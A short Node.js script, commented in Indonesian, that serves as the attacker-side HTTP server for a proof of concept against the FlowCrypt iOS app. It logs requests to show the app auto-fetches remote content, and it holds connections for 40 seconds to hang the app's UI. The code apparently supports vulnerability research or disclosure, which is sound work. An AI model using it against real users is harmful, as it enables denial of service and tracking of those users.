#!/usr/bin/env node
/**
 * Attacker host untuk PoC FlowCrypt iOS (F1: auto-fetch, F2: dos-hang).
 * Server HTTP sederhana: catat setiap request ke stdout (jadi log server-side
 * dengan timestamp, dibawa ke artifacts) dan balas 200.
 *
 * Mode dos-hang (F2): kalau path mengandung "F2", koneksi ditahan selama
 * HIT_SERVER_HOLD_MS (default 40000) sebelum dijawab -> app dengan
 * Data(contentsOf:) tanpa timeout akan menggantung (UI hang).
 *
 * Usage: node hit-server.js <port>
 */
'use strict';
const http = require('http');

const port = Number(process.argv[2] || 8002);
const holdMs = Number(process.env.HIT_SERVER_HOLD_MS || 40000);

const server = http.createServer((req, res) => {
  const t = new Date().toISOString();
  const isHold = /F2|hold/i.test(req.url || '');
  console.log(`[${t}] HIT ${req.method} ${req.url} from ${req.socket.remoteAddress} hold=${isHold}`);

  if (isHold) {
    // dos-hang: tahan koneksi; app tanpa timeout akan stuck menunggu
    setTimeout(() => {
      res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
      res.end(Buffer.alloc(1024, 0x42));
    }, holdMs);
  } else {
    res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
    res.end(Buffer.alloc(128, 0x41));
  }
});

server.listen(port, '127.0.0.1', () => console.log(`[${new Date().toISOString()}] hit-server listening on 127.0.0.1:${port}`));
